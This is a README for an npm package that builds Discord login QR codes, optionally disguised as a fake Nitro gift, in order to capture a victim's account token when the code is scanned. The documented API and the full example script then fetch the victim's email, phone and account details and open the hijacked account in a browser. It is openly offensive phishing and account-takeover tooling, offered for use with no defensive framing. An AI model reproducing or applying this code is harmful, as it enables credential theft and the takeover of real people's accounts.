# Discord-tqr

Generate QR code to get user token to take control of the account, get informations ...

## Update

- See [changelog](CHANGELOG.md)

## 💻 Installation

```
$ npm i discord-tqr
```

## 📚 Usage

### Import

```js
import DiscordTQR from "discord-tqr";
//or
const DiscordTQR = require("discord-tqr").default;
```

### API

```js
const handler = new DiscordTQR();
```

## Generate a QR Code

<img src="./assets/qr.png" alt="QR Code" height="200"></img>
<img src="./assets/qr-with-template.png" alt="QR Code" height="200"></img>

options:

- `path?`: string - Path where you want to save the QR code in png format
- `template?`: "default" | { path: string, x?: number, y?: number, width?: number, height?: number } - If you want to apply a template to the QR code. With "default" you can create a fake nitro gift. You can also make a custom one with `path` for the template image and `x, y, width, height` for the x/y position of the QR code on the template and the width/height for the size of the QR code on the template.
- `wait?`: number - If you have trouble when getting the QR Code you can wait full page loaded by setting a wait time in ms like 5000 (by default it's 0).
- `browserOptions?`: puppeteer.PuppeteerLaunchOptions - Browser options for puppeter by default it's `{ headless: true, defaultViewport: null }`

> **_NOTE:_** With a template it's not a buffer but base64 string returned

```ts
//Generate a QR Code
const buffer = await handler.getQRCode(options?: {
    path?: string,
    browserOptions?: puppeteer.PuppeteerLaunchOptions,
    wait?: number,
    template?: "default" | { path?: string, x?: number, y?: number, width?: number, height?: number },
    encoding?: string
});
const base64 = buffer.toString("base64");
```

## Listening for token

> **_NOTE:_** This method work only if you launch "getQRCode" before

```ts
//Return the token in a string when the QR code is scanned
const token = await handler.listenForToken();
```

## Get user informations

- `token?`: string - The token of the user by default it's the token from `listForToken` method

```ts
//Return json object with user informations like subscription, email, phone, avatar, name ...
const user = await handler.getDiscordAccountInfo(token?: string);
```

Result:

```js
{
  id: '...',
  username: '...',
  avatar: '...',
  avatar_decoration: null,
  discriminator: '...',
  public_flags: 0,
  flags: 0,
  banner: null,
  banner_color: null,
  accent_color: null,
  bio: '...',
  locale: 'fr',
  nsfw_allowed: true,
  mfa_enabled: false,
  email: '...',
  verified: true,
  phone: "...",
  user: '...#...',
  avatar_url: 'https://cdn.discordapp.com/avatars/...',
  subscription: [...]
}
```

## Open user account

options:

- `token?`: string - The token of the user by default it's the token from `listForToken` method
- `browserOptions?`: puppeteer.PuppeteerLaunchOptions - Browser options for puppeter by default it's `{ headless: false, defaultViewport: null, args: ["--start-fullscreen"] }`

```ts
//Open discord account in chromium with puppeteer
const {browser, page} = await handler.openDiscordAccount(options?: { token?: string, browserOptions?: puppeteer.PuppeteerLaunchOptions });
```

## Close browser for QR code generation

```ts
//Close the browser used for generating the QR Code and for listenForToken
await handler.closeConnection();
```

# Example

```js
const path = require("path");
const DiscordTQR = require("discord-tqr").default;

(async function () {
  try {
    const handler = new DiscordTQR();

    console.log("Creating qr code...");
    await handler.getQRCode({
      path: path.resolve(__dirname, "./qr-with-template.png"),
      template: "default",
    });
    console.log("QR code created to ./qr-with-template.png !");

    console.log("Waiting for token...");
    await handler.listenForToken();
    console.log("Token: ", handler.token);

    console.log("Getting user informations...");
    await handler.getDiscordAccountInfo();
    console.log("User information:", handler.user);

    console.log("Opening user account...");
    const { browser, page } = await handler.openDiscordAccount();

    setTimeout(async () => {
      console.log("Closing opened browser...");
      await browser.close();
    }, 60000);

    console.log("Closing connection...");
    await handler.closeConnection();
  } catch (e) {
    console.log(e);
  }
})();
```
